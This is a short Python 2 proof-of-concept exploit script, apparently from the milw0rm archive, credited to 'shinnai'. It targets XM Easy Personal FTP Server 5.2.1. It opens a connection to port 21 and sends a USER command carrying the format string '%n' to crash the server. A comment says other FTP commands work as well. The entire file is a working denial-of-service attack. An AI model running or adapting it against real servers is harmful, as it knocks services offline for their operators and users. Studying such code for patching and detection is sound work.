import sys,os,string
import socket
import time

print "-----------------------------------------------------------------------"
print "# XM Easy Personal FTP Server 5.2.1 format string Denial of Service"
print "# url: http://www.dxm2008.com/"
print "# author: shinnai"
print "# mail: shinnai[at]autistici[dot]org"
print "# site: http://shinnai.altervista.org"
print "-----------------------------------------------------------------------"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
   conn = s.connect(("127.0.0.1",21))
except:
   print "- Unable to connect. exiting."

d = s.recv(1024)
time.sleep(2)
s.send('USER %s\r\n' % "%n") # or use every available command or really what you like
time.sleep(2)                # I try to use CFGHT command and it works :)

# milw0rm.com [2006-12-22]
